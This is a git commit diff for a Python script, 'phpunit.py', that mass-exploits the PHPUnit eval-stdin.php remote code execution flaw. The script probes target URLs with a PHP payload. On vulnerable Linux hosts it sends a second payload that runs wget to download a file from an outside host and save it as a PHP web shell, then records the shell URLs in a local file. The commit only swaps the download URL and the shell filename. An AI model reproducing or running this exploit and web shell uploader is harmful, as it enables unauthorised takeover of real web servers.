ed6d7d987e3b663958be83084b7777d127e6d50f
RamaCaptainKID <48668839+RamaCaptainKID@users.noreply.github.com>
2019-06-17 14:29:14 +0700

    Update phpunit.py

--- phpunit.py
+++ phpunit.py
@@ -23,17 +23,17 @@ print banner
 def rce(url):
     try:
         cekos = '<?php echo php_uname(); ?>'
-        upshell = '<?php system("wget http://www.dvakapitana.com.ua/image/data/phototestimonial/0lo8hftmbtsptkil47odchpv50/_lala.txt -O _lala.php"); ?>'
+        upshell = '<?php system("wget https://dvakapitana.com.ua/image/data/special/uploader.txt -O uploader.php"); ?>'
         url = url.strip()
         print "[Exploiting] " + url
         cek = r.post(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=cekos)
         if 'Linux' in cek.text:
             print "[Vuln] " + url
             r.post(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=upshell)
-            cekshell = r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/_lala.php')
+            cekshell = r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/uploader.php')
             if 'GIF89a' in cekshell.text:
                 print "[Shell Uploaded] " + url
-                open('shell_phpunit.txt', 'a').write(cek.text+'\n'+url+'/vendor/phpunit/phpunit/src/Util/PHP/_lala.php'+'\n')
+                open('shell_phpunit.txt', 'a').write(cek.text+'\n'+url+'/vendor/phpunit/phpunit/src/Util/PHP/uploader.php'+'\n')
             else:
                 print "[Shell not Uploaded]" + url
         else:
